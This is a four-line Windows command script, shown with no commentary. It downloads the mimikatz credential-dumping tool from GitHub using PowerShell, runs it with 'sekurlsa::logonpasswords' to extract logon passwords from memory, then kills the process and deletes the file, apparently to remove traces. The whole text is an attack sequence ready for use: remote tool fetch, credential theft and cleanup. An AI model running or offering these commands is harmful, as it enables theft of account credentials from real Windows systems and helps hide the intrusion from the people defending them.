powershell -command "Invoke-WebRequest -Uri 'https://github.com/ParrotSec/mimikatz/raw/master/x64/mimikatz.exe' -OutFile 'mimikatze.exe'"
powershell -command "C:\Users\WDAGUtilityAccount\Desktop\mimikatze.exe sekurlsa::logonpasswords"
taskkill /IM "mimikatze.exe" /F
del mimikatze.exe

